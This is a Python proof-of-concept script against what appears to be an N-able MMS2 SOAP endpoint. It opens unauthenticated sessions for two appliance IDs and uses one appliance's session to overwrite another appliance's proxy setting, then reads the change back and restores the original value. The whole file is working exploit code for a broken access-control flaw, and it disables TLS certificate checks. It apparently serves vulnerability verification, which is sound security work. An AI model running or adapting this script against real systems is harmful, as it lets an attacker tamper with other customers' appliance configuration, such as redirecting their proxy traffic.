#!/usr/bin/env python3
import argparse
import html
import re

import requests
import urllib3


PREFIX = ('<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" '
          'xmlns:m="http://mms2.nobj.nable.com/"><soap:Body>')
SUFFIX = '</soap:Body></soap:Envelope>'


class MMS2:
    def __init__(self, target):
        self.url = target.rstrip("/") + "/dms2/services2/ServerMMS2"
        self.http = requests.Session()
        self.http.verify = False
        self.http.headers.update({"Content-Type": "application/soap+xml; charset=UTF-8"})

    def call(self, xml):
        return self.http.post(self.url, data=PREFIX + xml + SUFFIX, timeout=30)

    def hello(self, appliance_id):
        response = self.call(
            '<m:SessionHello><m:version>2.0.0</m:version>'
            '<m:applianceVersion>2026.4.0.31</m:applianceVersion>'
            '<m:agent_OSID>winnt</m:agent_OSID><m:agent_OS>Windows</m:agent_OS>'
            f'<m:applianceID>{appliance_id}</m:applianceID>'
            '<m:timeZoneID>-05:00</m:timeZoneID></m:SessionHello>')
        response.raise_for_status()
        match = re.search(r'<return>([1-9][0-9]*)</return>', response.text)
        if not match:
            raise RuntimeError("SessionHello returned no session")
        return int(match.group(1))

    def read_proxy(self, sid):
        response = self.call(
            f'<m:ApplianceGetConfig><m:sessionID>{sid}</m:sessionID>'
            '<m:configTypes>ApplianceConfig</m:configTypes></m:ApplianceGetConfig>')
        response.raise_for_status()
        match = re.search(r'<Key1>ProxyString</Key1>.*?<Values>(.*?)</Values>', response.text, re.S)
        return html.unescape(match.group(1)) if match else ""

    def write_proxy(self, sid, appliance_id, value):
        return self.call(
            f'<m:ApplianceActionUpdate><m:sessionID>{sid}</m:sessionID>'
            f'<m:applianceID>{appliance_id}</m:applianceID><m:actionDetail>'
            '<m:ActionType>ProxyFailure</m:ActionType><m:ActionDetails>'
            f'<m:Key>oldProxy</m:Key><m:Value>{html.escape(value)}</m:Value>'
            '</m:ActionDetails></m:actionDetail></m:ApplianceActionUpdate>')

    def quit(self, sid):
        self.call(f'<m:SessionQuit><m:sessionID>{sid}</m:sessionID>'
                  '<m:shutdown>false</m:shutdown></m:SessionQuit>')


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="https://192.168.1.14")
    parser.add_argument("--source-appliance", type=int, required=True)
    parser.add_argument("--target-appliance", type=int, required=True)
    parser.add_argument("--value", required=True)
    args = parser.parse_args()
    if args.source_appliance == args.target_appliance:
        parser.error("source and target must differ")

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    client = MMS2(args.target)
    source_sid = target_sid = None
    original = None
    changed = False
    try:
        source_sid = client.hello(args.source_appliance)
        target_sid = client.hello(args.target_appliance)
        original = client.read_proxy(target_sid)
        control = client.write_proxy(1, args.target_appliance, args.value)
        if control.status_code < 400:
            raise RuntimeError("invalid-session control succeeded")
        print(f"invalid_session_http={control.status_code}")
        response = client.write_proxy(source_sid, args.target_appliance, args.value)
        response.raise_for_status()
        changed = True
        observed = client.read_proxy(target_sid)
        print(f"cross_appliance_readback_matches={observed == args.value}")
        return 0 if observed == args.value else 1
    finally:
        if changed:
            client.write_proxy(source_sid, args.target_appliance, original).raise_for_status()
            print(f"restored={client.read_proxy(target_sid) == original}")
        for sid in (source_sid, target_sid):
            if sid:
                client.quit(sid)


if __name__ == "__main__":
    raise SystemExit(main())
